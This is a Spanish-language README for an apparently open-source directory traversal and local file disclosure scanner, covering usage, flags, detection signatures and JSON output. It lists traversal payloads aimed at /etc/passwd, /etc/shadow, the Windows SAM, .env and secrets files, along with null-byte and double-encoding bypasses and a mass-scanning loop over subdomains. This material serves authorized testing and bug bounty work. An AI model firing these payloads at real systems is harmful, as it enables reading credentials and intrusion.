# tool-lfdscanner v2.0

Escáner avanzado de **Local File Disclosure (LFD)** y **Directory Traversal** con detección mejorada y reporting completo.

---

## 🚀 Novedades v2.0 (2026)

### Mejoras Técnicas
- ✅ **Biblioteca de payloads ampliada** (55+ paths Unix/Windows)
- ✅ **Detección inteligente** con múltiples patrones de firma
- ✅ **Sistema de confianza** (high/medium/low)
- ✅ **Encoding bypass** (URL, double URL, base64)
- ✅ **Baseline differential analysis** para reducción de falsos positivos
- ✅ **Rate limiting** configurable
- ✅ **Autenticación** con headers personalizados
- ✅ **JSON reporting** estructurado

### Payloads Mejorados
- Paths de hasta 7 niveles de profundidad
- Archivos sensibles: `/etc/shadow`, `/etc/hostname`, `/proc/self/environ`
- Logs de sistema: `/var/log/auth.log`, `/var/log/apache2/access.log`
- Windows: `boot.ini`, `SAM`, absolute paths
- Bypass: null byte, double encoding, dot truncation

---

## 📦 Instalación

```bash
git clone https://github.com/theoffsecgirl/tool-lfdscanner.git
cd tool-lfdscanner
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## 🔥 Uso Básico

### Un solo objetivo con FUZZ

```bash
python3 lfdscanner.py -u "https://target.com/download.php?file=FUZZ"
```

### Lista de objetivos

```bash
python3 lfdscanner.py -L targets.txt -o results.json
```

### Con encoding bypass

```bash
python3 lfdscanner.py -u "https://target.com/view?path=FUZZ" \
  --encoding-bypass \
  -v
```

### Con autenticación

```bash
python3 lfdscanner.py -u "https://app.com/files?file=FUZZ" \
  --auth-header "Authorization: Bearer TOKEN"
```

---

## ⚙️ Opciones CLI

| Flag                | Descripción                                      |
|---------------------|-------------------------------------------------|
| `-u, --url`         | URL objetivo (puede contener FUZZ)              |
| `-L, --list`        | Archivo con lista de URLs                       |
| `--paths`           | Archivo con paths personalizados                |
| `-p, --param`       | Parámetro a inyectar (default: file)            |
| `-t, --timeout`     | Timeout en segundos (default: 5)                |
| `-T, --threads`     | Número de threads (default: 10)                 |
| `-A, --agent`       | User-Agent personalizado                        |
| `--auth-header`     | Header de autenticación                         |
| `--insecure`        | Desactivar verificación TLS                     |
| `--rate-limit`      | Peticiones por segundo (default: 20)            |
| `--encoding-bypass` | Intentar bypass con encoding                    |
| `-o, --json-output` | Guardar resultados en JSON                      |
| `-v, --verbose`     | Modo verbose                                    |

---

## 🎯 Detección Mejorada

### Patrones de Firma

**Unix/Linux (`/etc/passwd`):**
- `root:x:0:0:`
- `daemon:x:`
- `/bin/bash`
- `nobody:x:`

**Shadow File (`/etc/shadow`):**
- `$6$` (SHA-512 hash)
- `$5$` (SHA-256 hash)
- `root:!:`

**Windows:**
- `[extensions]`
- `[fonts]`
- `C:\WINDOWS`
- `[MCI Extensions]`

**Log Files:**
- `GET /`
- `User-Agent:`
- `HTTP/1.1`

### Sistema de Confianza

- **High**: Archivo sensible confirmado (passwd, shadow, win.ini)
- **Medium**: Archivo de log o sistema con patrones parciales
- **Low**: Detección heurística

---

## 📊 Formato JSON Output

```json
{
  "generated_at": "2026-03-04T17:30:00Z",
  "scanner_version": "2.0",
  "targets_scanned": 5,
  "vulnerabilities_found": 3,
  "confidence_summary": {
    "high": 2,
    "medium": 1,
    "low": 0
  },
  "findings": {
    "https://target.com/download.php": [
      {
        "url": "https://target.com/download.php?file=../../etc/passwd",
        "payload": "../../etc/passwd",
        "encoding": "none",
        "status_code": 200,
        "response_size": 1547,
        "evidence": "Archivo Unix detectado: root:x:0:0:",
        "confidence": "high",
        "timestamp": 1709577600.123
      }
    ]
  }
}
```

---

## 💻 Ejemplos Avanzados

### Bug Bounty Pipeline

```bash
# Escaneo de múltiples subdominios
cat subdomains.txt | while read domain; do
  python3 lfdscanner.py -u "https://$domain/view?file=FUZZ" \
    --threads 20 \
    --encoding-bypass \
    -o "lfd_$domain.json"
done
```

### Con paths personalizados

```bash
# custom_paths.txt
../../../app/config/database.yml
../../../.env
../../../config/secrets.json

python3 lfdscanner.py -L targets.txt \
  --paths custom_paths.txt \
  --threads 15
```

### Rate limiting para WAF bypass

```bash
python3 lfdscanner.py -u "https://target.com/api/file?path=FUZZ" \
  --rate-limit 5 \
  --encoding-bypass \
  -v
```

---

## 🧰 Payloads Incluidos

### Unix/Linux (45+ paths)
- `/etc/passwd` (7 niveles)
- `/etc/shadow` (5 niveles)
- `/etc/hosts`, `/etc/hostname`, `/etc/issue`
- `/proc/self/environ`, `/proc/version`
- `/var/log/auth.log`, `/var/log/apache2/access.log`
- Absolute paths: `/etc/passwd`

### Windows (10+ paths)
- `win.ini`, `system.ini`, `boot.ini`
- `drivers/etc/hosts`
- `system32/config/sam`
- Absolute paths: `C:/windows/win.ini`

### Bypass Techniques
- Null byte: `../../etc/passwd%00`
- Double encoding: `..%252f..%252fetc%252fpasswd`
- Dot truncation: `../../etc/passwd.........`

---

## ⚠️ Limitaciones

- No soporta POST body injection (solo GET params)
- Encoding bypass limitado a URL/double URL/base64
- Detección basada en patrones (puede tener falsos positivos)
- No realiza análisis de permisos del archivo extraído

**tool-lfdscanner es una herramienta de reconnaissance, no un reemplazo de análisis manual.**

---

## 🔬 Roadmap

- [ ] POST body injection support
- [ ] Base64 encoding bypass
- [ ] Wrapper protocols (php://, file://, etc.)
- [ ] Automated evidence extraction
- [ ] HTML reporting
- [ ] Integration con Burp Suite

---

## 📖 Uso Ético

Utiliza esta herramienta únicamente en:
- ✅ Sistemas propios
- ✅ Entornos autorizados
- ✅ Programas de bug bounty con scope definido

**El uso no autorizado es ilegal.**

---

## 📜 Licencia

MIT License
